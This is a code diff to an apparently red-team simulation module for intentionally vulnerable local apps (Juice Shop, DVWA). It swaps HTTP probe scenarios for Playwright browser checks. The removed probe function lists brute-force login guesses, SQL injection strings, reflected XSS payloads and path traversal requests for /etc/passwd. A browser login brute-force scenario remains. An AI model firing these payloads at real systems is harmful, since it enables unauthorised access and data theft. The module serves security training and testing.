@@ -13,30 +13,28 @@ from __future__ import annotations
 from typing import Optional
 
 from ...red_agent_models import AttackScenario
-from ...vulnerable_apps_models import SupportedTemplate
 
 
 SCENARIO_CATALOG = [
     AttackScenario(
-        scenario_id="login_bruteforce",
-        display_name="Login Brute-Force Simulation",
-        description="Send a bounded burst of login attempts to the selected local target.",
-        notes="Operator-only simulation against the chosen platform-managed target.",
+        scenario_id="browser_homepage_smoke",
+        display_name="Browser Homepage Smoke",
+        description="Open the managed target homepage in Playwright and capture a screenshot.",
+        execution_mode="browser",
+        notes="Safe bounded browser validation against the managed local target only.",
     ),
     AttackScenario(
-        scenario_id="sql_injection_probe",
-        display_name="SQL Injection Probe",
-        description="Send a small set of injection-style probes to search or login endpoints.",
+        scenario_id="browser_login_navigation",
+        display_name="Browser Login Navigation",
+        description="Open the target in Playwright and navigate to a login or account view where safely available.",
+        execution_mode="browser",
     ),
     AttackScenario(
-        scenario_id="xss_probe",
-        display_name="XSS Probe",
-        description="Send a small set of reflected-input probes appropriate for local web targets.",
-    ),
-    AttackScenario(
-        scenario_id="path_traversal_probe",
-        display_name="Path Traversal Probe",
-        description="Send a bounded set of path traversal probes against local file-oriented routes.",
+        scenario_id="browser_login_bruteforce",
+        display_name="Browser Login Brute-Force",
+        description="Attempt a small bounded set of browser-based login submissions if a login page is available.",
+        execution_mode="browser",
+        notes="Uses only a tiny predefined credential list against the selected managed local target.",
     ),
 ]
 
@@ -47,67 +45,3 @@ def get_scenario_catalog() -> list[AttackScenario]:
 
 def get_scenario(scenario_id: str) -> Optional[AttackScenario]:
     return next((scenario for scenario in SCENARIO_CATALOG if scenario.scenario_id == scenario_id), None)
-
-
-def build_probe_plan(template_id: SupportedTemplate, scenario_id: str) -> list[dict[str, object]]:
-    """Return a bounded list of HTTP probes for a scenario/template pair."""
-    if scenario_id == "login_bruteforce":
-        if template_id == SupportedTemplate.JUICE_SHOP:
-            return [
-                {"method": "POST", "path": "/rest/user/login", "body": {"email": "admin@juice-sh.op", "password": "guess1"}},
-                {"method": "POST", "path": "/rest/user/login", "body": {"email": "admin@juice-sh.op", "password": "guess2"}},
-                {"method": "POST", "path": "/rest/user/login", "body": {"email": "admin@juice-sh.op", "password": "guess3"}},
-            ]
-        if template_id == SupportedTemplate.DVWA:
-            return [
-                {"method": "GET", "path": "/login.php"},
-                {"method": "GET", "path": "/login.php?username=admin&password=guess1&Login=Login"},
-                {"method": "GET", "path": "/login.php?username=admin&password=guess2&Login=Login"},
-            ]
-        return [
-            {"method": "POST", "path": "/identity/api/auth/login", "body": {"email": "operator@example.local", "password": "guess1"}},
-            {"method": "POST", "path": "/identity/api/auth/login", "body": {"email": "operator@example.local", "password": "guess2"}},
-        ]
-
-    if scenario_id == "sql_injection_probe":
-        if template_id == SupportedTemplate.JUICE_SHOP:
-            return [
-                {"method": "GET", "path": "/rest/products/search?q=' OR 1=1--"},
-                {"method": "GET", "path": "/rest/products/search?q=%27%20UNION%20SELECT"},
-            ]
-        if template_id == SupportedTemplate.DVWA:
-            return [
-                {"method": "GET", "path": "/vulnerabilities/sqli/?id=1%27%20or%201=1--&Submit=Submit"},
-            ]
-        return [
-            {"method": "GET", "path": "/identity/api/auth/login?email=' OR 1=1--"},
-            {"method": "GET", "path": "/workshop/api/shop/products?query=' OR 1=1--"},
-        ]
-
-    if scenario_id == "xss_probe":
-        if template_id == SupportedTemplate.JUICE_SHOP:
-            return [
-                {"method": "GET", "path": "/#/search?q=%3Cscript%3Ealert(1)%3C/script%3E"},
-            ]
-        if template_id == SupportedTemplate.DVWA:
-            return [
-                {"method": "GET", "path": "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E"},
-            ]
-        return [
-            {"method": "GET", "path": "/workshop/api/support/tickets?message=%3Cscript%3Ealert(1)%3C/script%3E"},
-        ]
-
-    if scenario_id == "path_traversal_probe":
-        if template_id == SupportedTemplate.JUICE_SHOP:
-            return [
-                {"method": "GET", "path": "/ftp/%2e%2e/%2e%2e/%2e%2e/etc/passwd"},
-            ]
-        if template_id == SupportedTemplate.DVWA:
-            return [
-                {"method": "GET", "path": "/vulnerabilities/fi/?page=../../../../etc/passwd"},
-            ]
-        return [
-            {"method": "GET", "path": "/workshop/api/documents/../../../../etc/passwd"},
-        ]
-
-    return []
